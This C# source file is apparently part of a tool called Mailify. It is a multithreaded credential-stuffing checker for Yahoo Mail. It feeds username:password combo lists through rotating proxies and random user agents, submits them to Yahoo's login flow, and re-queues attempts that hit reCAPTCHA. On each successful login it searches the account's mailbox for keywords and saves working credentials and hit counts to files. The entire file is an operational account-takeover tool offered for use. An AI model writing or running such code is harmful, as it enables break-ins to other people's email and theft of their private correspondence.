using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;

namespace Mailify
{
    internal class Yahoo_1_Scanner
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    string RANUA = Http.RandomUserAgent();
                    var USERR = WebUtility.UrlEncode("" + credentials[0]);
                    var PASSS = WebUtility.UrlEncode("" + credentials[1]);
                    request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    request.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                    request.AddHeader("Cache-Control", "max-age=0");
                    request.AddHeader("Connection", "keep-alive");
                    request.AddHeader("Referer", "https://www.google.com/");
                    request.AddHeader("Sec-Fetch-Dest", "document");
                    request.AddHeader("Sec-Fetch-Mode", "navigate");
                    request.AddHeader("Sec-Fetch-Site", "cross-site");
                    request.AddHeader("Sec-Fetch-User", "?1");
                    request.AddHeader("Upgrade-Insecure-Requests", "1");
                    request.AddHeader("User-Agent", "" + RANUA + "");

                    var res0 = request.Get("https://login.yahoo.com/");
                    string text0 = res0.ToString();

                    var acrumb = Functions.LR(text0, "\"acrumb\" value=\"", "\"").FirstOrDefault();
                    var sessionIndex = Functions.LR(text0, "sessionIndex\" value=\"", "\"").FirstOrDefault();
                    request.AddHeader("Accept", "*/*");
                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    request.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                    request.AddHeader("bucket", "mbr-phoenix-gpst");
                    request.AddHeader("Connection", "keep-alive");
                    request.AddHeader("Origin", "https://login.yahoo.com");
                    request.AddHeader("Referer", "https://login.yahoo.com/");
                    request.AddHeader("Sec-Fetch-Dest", "empty");
                    request.AddHeader("Sec-Fetch-Mode", "cors");
                    request.AddHeader("Sec-Fetch-Site", "same-origin");
                    request.AddHeader("User-Agent", "" + RANUA + "");
                    request.AddHeader("X-Requested-With", "XMLHttpRequest");

                    var res1 = request.Post("https://login.yahoo.com/", "acrumb=" + acrumb + "&sessionIndex=" + sessionIndex + "&username=" + USERR + "&passwd=&signin=Next", "application/x-www-form-urlencoded; charset=UTF-8");
                    string text1 = res1.ToString();

                    var URL = Functions.LR(text1, "{\"location\":\"", "\"}").FirstOrDefault();


                    if (!text1.Contains("{\"error\":\"messages.ERROR_INVALID_USERNAME"))
                    {
                        request.AllowAutoRedirect = false;
                        request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                        request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                        request.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                        request.AddHeader("Cache-Control", "max-age=0");
                        request.AddHeader("Connection", "keep-alive");
                        request.AddHeader("Origin", "https://login.yahoo.com");
                        request.AddHeader("Referer", "https://login.yahoo.com/");
                        request.AddHeader("Sec-Fetch-Dest", "document");
                        request.AddHeader("Sec-Fetch-Mode", "navigate");
                        request.AddHeader("Sec-Fetch-Site", "same-origin");
                        request.AddHeader("Sec-Fetch-User", "?1");
                        request.AddHeader("Upgrade-Insecure-Requests", "1");
                        request.AddHeader("User-Agent", "" + RANUA + "");

                        var res2 = request.Post("https://login.yahoo.com" + URL + "", "crumb=czI9ivjtMSr&acrumb=" + acrumb + "&sessionIndex=QQ--&displayName=" + USERR + "&passwordContext=normal&password=" + PASSS + "&verifyPassword=Next", "application/x-www-form-urlencoded");
                        string text2 = res2.ToString();


                        if (text2.Contains("https://guce.yahoo.com/consent?gcrumb="))
                        {
                            RETRY:
                            request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                            request.AddHeader("Pragma", "no-cache");
                            request.AddHeader("Accept", "*/*");
                            string pre = request.Get("https://mail.yahoo.com/").ToString();
                            var WSSID = Functions.LR(pre, "mailWssid\":\"", "\",\"calendarWssid").FirstOrDefault();
                            foreach (string line in File.ReadAllLines("Files//Keywords.txt"))
                            {
                                string get = request.Get($"https://data.mail.yahoo.com/psearch/v3/srp?expand=MAIN&query={line}&appid=YMailNorrin&wssid={WSSID}").ToString();
                                if (get.Contains("EC-4003"))
                                {
                                    Variables.Errors++;
                                    goto RETRY;
                                }
                                else
                                {
                                    int a = Regex.Matches(get, line).Count;
                                    if (a == 0)
                                    {
                                        Variables.Custom++;
                                        Variables.Checked++;
                                        Variables.cps++;
                                        lock (Variables.WriteLock)
                                        {
                                            Variables.remove(combo);
                                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    else
                                    {
                                        Variables.Valid++;
                                        Variables.Checked++;
                                        Variables.cps++;
                                        lock (Variables.WriteLock)
                                        {
                                            Variables.remove(combo);
                                            if (Config.kekr_UI == "LOG")
                                            {
                                                Console.WriteLine($"[+] " + combo + " | Keyword: " + line + " | Results: " + a, Color.Green);
                                            }
                                            File.AppendAllText(Variables.results + $"{line}.txt", combo + " | Keyword: " + line + " | Results: " + a + Environment.NewLine);
                                        }
                                    }
                                }
                            }
                         
                        }
                        else if (text2.Contains("/account/challenge/password?") || text2.Contains("Get Account Key code") || text2.Contains("recognize"))
                        {
                            Variables.Invalid++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                            }
                        }
                        else if (text2.Contains("account/challenge/fail?src") || text2.Contains("Not Found") || text2.Contains("account/challenge/phone-obfuscation") || text2.Contains(">Open any Yahoo app<"))
                        {
                            Variables.Custom++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                            }
                        }
                        else
                        {
                            Variables.combos.Enqueue(combo);
                            Variables.proxyIndex++;
                            Variables.Errors++;
                        }
                    }
                    else if (text1.Contains("{\"error\":\"messages.ERROR_INVALID_USERNAME") || text1.Contains("account/challenge/push?src=noSrc") || text1.Contains("Sorry, we don't recognize this email"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (text1.Contains("recaptcha"))
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                    else if (text1.Contains("account/challenge/phone-obfuscation") || text1.Contains(">Open any Yahoo app<"))
                    {

                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}
